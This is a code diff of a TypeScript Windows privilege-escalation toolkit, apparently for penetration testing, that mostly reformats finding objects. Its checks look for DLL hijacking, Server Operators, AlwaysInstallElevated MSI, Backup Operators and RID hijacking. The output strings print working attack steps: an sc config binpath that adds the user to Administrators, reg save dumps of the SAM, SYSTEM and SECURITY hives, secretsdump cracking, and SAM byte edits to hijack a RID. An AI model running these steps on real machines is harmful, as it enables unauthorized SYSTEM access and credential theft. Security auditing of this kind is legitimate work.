           output.push(`\n[${writable ? "!" : "*"}] ${t.service} → ${t.dll} (MISSING)`)
           output.push(`    Path: ${t.path}`)
           output.push(`    Directory writable: ${writable ? "YES" : "No"}`)
-          if (writable) findings.push({ checkId: "WIN-DLLSIDE-CMD", provider: "windows", severity: "high", status: "FAIL", resource: `service://${t.service}`, title: `Phantom DLL: ${t.service}/${t.dll}`, details: "DLL missing and directory writable", remediation: "Install the legitimate DLL or restrict directory write permissions" })
+          if (writable)
+            findings.push({
+              checkId: "WIN-DLLSIDE-CMD",
+              provider: "windows",
+              severity: "high",
+              status: "FAIL",
+              resource: `service://${t.service}`,
+              title: `Phantom DLL: ${t.service}/${t.dll}`,
+              details: "DLL missing and directory writable",
+              remediation: "Install the legitimate DLL or restrict directory write permissions",
+            })
         }
       }
     }
@@ -4176,10 +4393,19 @@ export async function serverOperatorAbuse(args: string[], timeout: number): Prom
       output.push(`[*] Backup Operators: ${isBackupOp ? "[!] YES" : "[-] No"}`)
       output.push(`[*] Print Operators: ${isPrintOp ? "[!] YES" : "[-] No"}`)
       if (isServerOp) {
-        findings.push({ checkId: "WIN-SRVOP-CMD", provider: "windows", severity: "critical", status: "FAIL", resource: "group://Server Operators", title: "Server Operators group member", details: "Can modify service binpaths → SYSTEM", remediation: "Remove user from Server Operators group" })
+        findings.push({
+          checkId: "WIN-SRVOP-CMD",
+          provider: "windows",
+          severity: "critical",
+          status: "FAIL",
+          resource: "group://Server Operators",
+          title: "Server Operators group member",
+          details: "Can modify service binpaths → SYSTEM",
+          remediation: "Remove user from Server Operators group",
+        })
         output.push("\n[!] Server Operators can modify services → SYSTEM escalation!")
         output.push("[*] Attack path:")
-        output.push("    1. sc config <service> binpath= \"cmd.exe /c net localgroup Administrators %username% /add\"")
+        output.push('    1. sc config <service> binpath= "cmd.exe /c net localgroup Administrators %username% /add"')
         output.push("    2. sc stop <service>")
         output.push("    3. sc start <service>")
       }
@@ -4328,10 +4554,21 @@ export async function dllHijack(args: string[], timeout: number): Promise<HookRe
       const dirs = pathVar.stdout.trim().split(";").filter(Boolean)
       for (const dir of dirs) {
         const acl = await cmd(`icacls "${dir}" 2>nul`, timeout)
-        const writable = acl.stdout.includes("BUILTIN\\Users") && (acl.stdout.includes("(F)") || acl.stdout.includes("(M)") || acl.stdout.includes("(W)"))
+        const writable =
+          acl.stdout.includes("BUILTIN\\Users") &&
+          (acl.stdout.includes("(F)") || acl.stdout.includes("(M)") || acl.stdout.includes("(W)"))
         if (writable) {
           output.push(`  [!] WRITABLE: ${dir}`)
-          findings.push({ checkId: "WIN-DLLHIJ-CMD", provider: "windows", severity: "high", status: "FAIL", resource: `path://${dir}`, title: `Writable PATH dir: ${dir}`, details: "DLL hijack possible", remediation: "Restrict write permissions on PATH directories" })
+          findings.push({
+            checkId: "WIN-DLLHIJ-CMD",
+            provider: "windows",
+            severity: "high",
+            status: "FAIL",
+            resource: `path://${dir}`,
+            title: `Writable PATH dir: ${dir}`,
+            details: "DLL hijack possible",
+            remediation: "Restrict write permissions on PATH directories",
+          })
         }
       }
       output.push("\n[*] Known DLL hijack targets for system processes:")
@@ -4343,7 +4580,10 @@ export async function dllHijack(args: string[], timeout: number): Promise<HookRe
       for (const t of hijackTargets) {
         output.push(`    ${t.exe} → ${t.dll}`)
       }
-      const safeDll = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs" 2>nul', timeout)
+      const safeDll = await cmd(
+        'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs" 2>nul',
+        timeout,
+      )
       output.push(`\n[*] KnownDLLs (protected from hijack):\n${safeDll.stdout.substring(0, 500)}`)
     }
     if (action === "check" && target) {
@@ -4563,20 +4803,38 @@ export async function msiAbuse(args: string[], timeout: number): Promise<HookRes
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== MSI Abuse (cmd.exe) ===\n")
     if (action === "check") {
-      const hklm = await cmd('reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul', timeout)
-      const hkcu = await cmd('reg query "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul', timeout)
+      const hklm = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul',
+        timeout,
+      )
+      const hkcu = await cmd(
+        'reg query "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul',
+        timeout,
+      )
       const hklmOn = hklm.stdout.includes("0x1")
       const hkcuOn = hkcu.stdout.includes("0x1")
       output.push(`[*] AlwaysInstallElevated:`)
       output.push(`    HKLM: ${hklmOn ? "[!] ENABLED" : "[-] Disabled/not set"}`)
       output.push(`    HKCU: ${hkcuOn ? "[!] ENABLED" : "[-] Disabled/not set"}`)
       if (hklmOn && hkcuOn) {
-        findings.push({ checkId: "WIN-MSIABUSE-CMD", provider: "windows", severity: "critical", status: "FAIL", resource: "registry://AlwaysInstallElevated", title: "AlwaysInstallElevated (MSI)", details: "Both keys enabled — any MSI runs as SYSTEM", remediation: "Set AlwaysInstallElevated to 0 in both HKLM and HKCU" })
+        findings.push({
+          checkId: "WIN-MSIABUSE-CMD",
+          provider: "windows",
+          severity: "critical",
+          status: "FAIL",
+          resource: "registry://AlwaysInstallElevated",
+          title: "AlwaysInstallElevated (MSI)",
+          details: "Both keys enabled — any MSI runs as SYSTEM",
+          remediation: "Set AlwaysInstallElevated to 0 in both HKLM and HKCU",
+        })
         output.push("\n[!] VULNERABLE — MSI installs run as SYSTEM!")
       }
-      const repair = await cmd('reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v EnableUserControl 2>nul', timeout)
+      const repair = await cmd(
+        'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v EnableUserControl 2>nul',
+        timeout,
+      )
       output.push(`\n[*] EnableUserControl: ${repair.stdout.includes("0x1") ? "ENABLED" : "not set"}`)
-      const msiSvc = await cmd('sc query msiserver 2>nul', timeout)
+      const msiSvc = await cmd("sc query msiserver 2>nul", timeout)
       output.push(`[*] MSI service: ${msiSvc.stdout.includes("RUNNING") ? "RUNNING" : "Stopped"}`)
     }
     if (action === "exploit" && payload) {
@@ -4836,7 +5094,16 @@ export async function backupOperatorAbuse(args: string[], timeout: number): Prom
       output.push(`[*] SeBackupPrivilege: ${hasBackup ? "PRESENT" : "MISSING"}`)
       output.push(`[*] SeRestorePrivilege: ${hasRestore ? "PRESENT" : "MISSING"}`)
       if (isBackupOp || hasBackup) {
-        findings.push({ checkId: "WIN-PRIVESC-BACKUP-001", provider: "windows", severity: "high", status: "VULNERABLE", resource: "privilege://SeBackupPrivilege", title: "Backup Operator / SeBackupPrivilege", details: "Can read any file regardless of ACL — SAM/SYSTEM/NTDS.dit", remediation: "Remove user from Backup Operators group. Revoke SeBackupPrivilege." })
+        findings.push({
+          checkId: "WIN-PRIVESC-BACKUP-001",
+          provider: "windows",
+          severity: "high",
+          status: "VULNERABLE",
+          resource: "privilege://SeBackupPrivilege",
+          title: "Backup Operator / SeBackupPrivilege",
+          details: "Can read any file regardless of ACL — SAM/SYSTEM/NTDS.dit",
+          remediation: "Remove user from Backup Operators group. Revoke SeBackupPrivilege.",
+        })
         output.push("\n[!] Attack paths:")
         output.push("    1. Dump SAM/SYSTEM hives:")
         output.push(`       reg save HKLM\\SAM ${outdir}\\SAM /y`)
@@ -4858,7 +5125,9 @@ export async function backupOperatorAbuse(args: string[], timeout: number): Prom
       output.push(`[*] SAM: ${r1.stdout.trim() || r1.stderr.trim()}`)
       output.push(`[*] SYSTEM: ${r2.stdout.trim() || r2.stderr.trim()}`)
       output.push(`[*] SECURITY: ${r3.stdout.trim() || r3.stderr.trim()}`)
-      output.push(`\n[*] Crack: secretsdump.py -sam "${outdir}\\SAM" -system "${outdir}\\SYSTEM" -security "${outdir}\\SECURITY" LOCAL`)
+      output.push(
+        `\n[*] Crack: secretsdump.py -sam "${outdir}\\SAM" -system "${outdir}\\SYSTEM" -security "${outdir}\\SECURITY" LOCAL`,
+      )
     }
     return { output: output.join("\n"), findings }
   }
@@ -5104,7 +5373,10 @@ export async function ridHijack(args: string[], timeout: number): Promise<HookRe
   if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
     output.push("=== RID Hijacking (cmd.exe) ===\n")
     if (action === "enum") {
-      const users = await cmd('wmic useraccount where "LocalAccount=TRUE" get Name,SID,Disabled /format:list 2>nul', timeout)
+      const users = await cmd(
+        'wmic useraccount where "LocalAccount=TRUE" get Name,SID,Disabled /format:list 2>nul',
+        timeout,
+      )
       output.push(`[*] Local users:\n${users.stdout}`)
       const sam = await cmd('reg query "HKLM\\SAM\\SAM\\Domains\\Account\\Users" 2>nul', timeout)
       if (sam.stdout.includes("HKEY_LOCAL_MACHINE")) {
@@ -5121,7 +5393,9 @@ export async function ridHijack(args: string[], timeout: number): Promise<HookRe
       output.push("\n[!] SAM binary edit needed (PS or external tool required):")
       output.push("    1. Export: reg save HKLM\\SAM SAM.bak /y")
       output.push("    2. Find user's F-value key under HKLM\\SAM\\SAM\\Domains\\Account\\Users\\<RID_HEX>")
-      output.push(`    3. Modify bytes at offset 0x30 to target RID (${targetRid} = 0x${parseInt(targetRid).toString(16).padStart(4, "0")})`)
+      output.push(
+        `    3. Modify bytes at offset 0x30 to target RID (${targetRid} = 0x${parseInt(targetRid).toString(16).padStart(4, "0")})`,
+      )
       output.push("    4. Import: reg restore HKLM\\SAM SAM.bak")
       output.push("\n[*] Tools: Mimikatz (sid::patch), RID_Hijack.exe")
     }
